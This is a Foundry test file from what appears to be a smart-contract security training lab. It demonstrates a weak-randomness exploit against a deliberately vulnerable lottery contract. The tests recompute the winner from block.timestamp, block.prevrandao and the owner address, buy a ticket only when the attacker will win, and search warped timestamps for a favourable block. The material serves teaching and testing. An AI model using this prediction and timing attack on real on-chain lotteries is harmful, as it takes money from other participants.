// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/07_WeakRandomness/VulnerableLottery.sol";
import "../src/07_WeakRandomness/LotteryAttacker.sol";

contract WeakRandomnessTest is Test {
    VulnerableLottery public lottery;
    LotteryAttacker public attacker;
    
    address public owner;
    address public player1;
    address public player2;
    address public attackerAddress;
    
    function setUp() public {
        owner = makeAddr("owner");
        player1 = makeAddr("player1");
        player2 = makeAddr("player2");
        attackerAddress = makeAddr("attacker");
        
        vm.deal(owner, 10 ether);
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);
        vm.deal(attackerAddress, 1 ether);
        
        vm.prank(owner);
        lottery = new VulnerableLottery();
    }
    
    function testLotteryBasics() public {
        vm.prank(player1);
        lottery.buyTicket{value: 0.1 ether}();
        
        assertEq(lottery.hasTicket(player1), true);
        assertEq(lottery.getPrizePool(), 0.1 ether);
    }
    
    function testRandomnessPrediction() public {
        console.log("=== Weak Randomness Demo ===");
        
        vm.startPrank(player1);
        lottery.buyTicket{value: 0.1 ether}();
        vm.stopPrank();
        
        vm.startPrank(player2);
        lottery.buyTicket{value: 0.1 ether}();
        vm.stopPrank();
        
        console.log("Current participants:", lottery.getParticipantsCount());
        
        vm.startPrank(attackerAddress);
        attacker = new LotteryAttacker(address(lottery));
        
        uint256 predictedIndex = attacker.predictWinnerIndex();
        uint256 attackerIndex = lottery.getParticipantsCount();
        
        console.log("Predicted winner index:", predictedIndex);
        console.log("Attacker would be at index:", attackerIndex);
        
        if (predictedIndex == attackerIndex) {
            console.log("[SUCCESS] Attacker will win!");
            attacker.attack{value: 0.1 ether}();
        } else {
            console.log("[INFO] Not favorable, skip this round");
        }
        vm.stopPrank();
        
        console.log("Prize pool:", lottery.getPrizePool());
        console.log("Total participants:", lottery.getParticipantsCount());
    }
    
    function testAttackSuccess() public {
        console.log("=== Successful Attack Demo ===\n");
        
        console.log("[Step 1] Players buy tickets");
        vm.startPrank(player1);
        lottery.buyTicket{value: 0.1 ether}();
        vm.stopPrank();
        console.log("Player1 bought ticket (index: 0)");
        
        vm.startPrank(player2);
        lottery.buyTicket{value: 0.1 ether}();
        vm.stopPrank();
        console.log("Player2 bought ticket (index: 1)");
        console.log("Prize pool:", lottery.getPrizePool() / 1e18, "ETH");
        console.log("Participants:", lottery.getParticipantsCount(), "\n");
        
        console.log("[Step 2] Attacker predicts winner");
        vm.startPrank(attackerAddress);
        attacker = new LotteryAttacker(address(lottery));
        
        console.log("Prediction calculation:");
        console.log("  block.timestamp =", block.timestamp);
        console.log("  block.prevrandao =", block.prevrandao);
        console.log("  lottery.owner() =", lottery.owner());
        
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.prevrandao,
            lottery.owner()
        )));
        uint256 winnerIndex = randomNumber % 3;
        
        console.log("\n[Step 3] Verify prediction");
        console.log("Random number:", randomNumber);
        console.log("Predicted winner index:", winnerIndex);
        console.log("Attacker will be at index: 2");
        
        console.log("\n[Step 4] Attacker buys ticket (only if they will win)");
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        if (winnerIndex == 2) {
            console.log("=> Favorable! Attacker will buy ticket");
            attacker.attack{value: 0.1 ether}();
            vm.stopPrank();
            
            console.log("Prize pool:", lottery.getPrizePool() / 1e18, "ETH");
            console.log("Participants:", lottery.getParticipantsCount());
            
            console.log("\n[Step 5] Owner draws lottery");
            vm.prank(owner);
            lottery.draw();
            
            uint256 attackerBalanceAfter = address(attacker).balance;
            uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
            
            console.log("\n[RESULT]");
            console.log("Attacker balance before:", attackerBalanceBefore / 1e18, "ETH");
            console.log("Attacker balance after:", attackerBalanceAfter / 1e18, "ETH");
            console.log("Profit:", profit / 1e18, "ETH");
            console.log("\n=> ATTACK SUCCESS! Attacker predicted and won!");
            
            assertTrue(profit > 0, "Attacker should profit!");
        } else {
            console.log("=> Not favorable. Attacker skips this round");
            console.log("(Winner will be:", winnerIndex == 0 ? "Player1)" : "Player2)");
            vm.stopPrank();
        }
    }
    
    function testMultipleAttempts() public {
        console.log("=== Timing Manipulation Demo ===");
        
        vm.startPrank(player1);
        lottery.buyTicket{value: 0.1 ether}();
        vm.stopPrank();
        console.log("Player1 bought ticket (index: 0)\n");
        
        bool attackerWillWin = false;
        LotteryAttacker successfulAttacker;
        
        console.log("Attacker tries different timestamps...");
        for (uint256 i = 0; i < 100; i++) {
            vm.warp(block.timestamp + i);
            
            vm.startPrank(attackerAddress);
            LotteryAttacker newAttacker = new LotteryAttacker(address(lottery));
            uint256 predictedIndex = newAttacker.predictWinnerIndex();
            uint256 attackerIndex = lottery.getParticipantsCount();
            
            if (predictedIndex == attackerIndex) {
                console.log("\n[FOUND] Favorable block at timestamp:", block.timestamp);
                console.log("Predicted winner index:", predictedIndex);
                console.log("Attacker will be at index:", attackerIndex);
                
                newAttacker.attack{value: 0.1 ether}();
                console.log("[ATTACK] Ticket purchased!");
                
                successfulAttacker = newAttacker;
                attackerWillWin = true;
                vm.stopPrank();
                break;
            }
            vm.stopPrank();
        }
        
        if (attackerWillWin) {
            console.log("\n[DRAW] Owner draws the lottery");
            uint256 attackerBalanceBefore = address(successfulAttacker).balance;
            
            vm.prank(owner);
            lottery.draw();
            
            uint256 attackerBalanceAfter = address(successfulAttacker).balance;
            console.log("\n[RESULT]");
            console.log("Attacker balance before:", attackerBalanceBefore / 1e18, "ETH");
            console.log("Attacker balance after:", attackerBalanceAfter / 1e18, "ETH");
            console.log("Profit:", (attackerBalanceAfter - attackerBalanceBefore) / 1e18, "ETH");
            console.log("\n=> ATTACK SUCCESS! Attacker manipulated timing to win!");
            
            assertTrue(attackerBalanceAfter > attackerBalanceBefore, "Attacker should win");
        } else {
            console.log("\n[INFO] No favorable block found in 100 attempts");
        }
    }
}

